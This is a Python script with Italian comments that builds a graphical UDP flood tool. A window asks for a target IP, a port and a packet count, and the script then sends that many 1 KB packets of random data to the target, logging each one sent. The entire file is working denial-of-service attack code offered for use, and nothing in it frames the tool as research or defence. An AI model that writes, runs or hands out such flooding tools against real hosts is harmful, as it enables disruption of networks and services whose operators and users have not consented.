import socket
import random
import ipaddress
import tkinter as tk
from tkinter import messagebox

# Funzione per gestire l'attacco UDP
def udp_flood_gui():
    try:
        target_ip = entry_ip.get()  # Ottieni IP dalla casella di input
        try:
            ipaddress.ip_address(target_ip)  # Validazione dell'indirizzo IP
        except ValueError:
            messagebox.showerror("Errore", "Indirizzo IP non valido.")
            return

        try:
            target_port = int(entry_port.get())  # Ottieni la porta dalla casella di input
            if not (1 <= target_port <= 65535):
                raise ValueError("La porta deve essere un numero intero tra 1 e 65535.")
        except ValueError as e:
            messagebox.showerror("Errore", str(e))
            return

        try:
            num_packets = int(entry_packets.get())  # Ottieni il numero di pacchetti
            if num_packets <= 0:
                raise ValueError("Il numero di pacchetti deve essere un intero positivo.")
        except ValueError as e:
            messagebox.showerror("Errore", str(e))
            return

        packet_size = 1024  # Dimensione dei pacchetti in byte (1KB)

        # Creazione del socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        log_text.insert(tk.END, f"Inizio dell'attacco UDP flood su {target_ip}:{target_port}\n")
        log_text.yview(tk.END)  # Scrolla fino in fondo per mostrare l'ultimo messaggio

        # Creazione di un pacchetto di dati casuali
        packet = random._urandom(packet_size)  # Genera dati casuali della dimensione specificata

        for i in range(num_packets):
            sock.sendto(packet, (target_ip, target_port))  # Invio del pacchetto
            log_text.insert(tk.END, f"Pacchetto {i + 1}/{num_packets} inviato\n")
            log_text.yview(tk.END)  # Scrolla fino in fondo per mostrare l'ultimo messaggio

        log_text.insert(tk.END, "Attacco completato.\n")
        log_text.yview(tk.END)

    except KeyboardInterrupt:
        log_text.insert(tk.END, "Attacco interrotto dall'utente.\n")
        log_text.yview(tk.END)
    except Exception as e:
        log_text.insert(tk.END, f"Errore: {e}\n")
        log_text.yview(tk.END)
    finally:
        try:
            sock.close()
        except NameError:
            pass

# Funzione per avviare l'attacco quando si clicca il pulsante
def start_attack():
    udp_flood_gui()

# Creazione della finestra principale
root = tk.Tk()
root.title("UDP Flood Attack")

# Impostazioni della finestra
root.geometry("600x400")

# Creazione dei widget per la GUI
label_ip = tk.Label(root, text="Indirizzo IP della macchina target:")
label_ip.pack()

entry_ip = tk.Entry(root, width=30)
entry_ip.pack()

label_port = tk.Label(root, text="Numero di porta UDP:")
label_port.pack()

entry_port = tk.Entry(root, width=30)
entry_port.pack()

label_packets = tk.Label(root, text="Numero di pacchetti da inviare:")
label_packets.pack()

entry_packets = tk.Entry(root, width=30)
entry_packets.pack()

# Pulsante per avviare l'attacco
start_button = tk.Button(root, text="Inizia attacco", command=start_attack)
start_button.pack(pady=10)

# Area di log per visualizzare i messaggi
log_text = tk.Text(root, width=70, height=15, wrap=tk.WORD)
log_text.pack(pady=10)
log_text.insert(tk.END, "Benvenuto! Inserisci i parametri e clicca 'Inizia attacco' per avviare l'attacco UDP.\n")

# Avvio della GUI
root.mainloop()
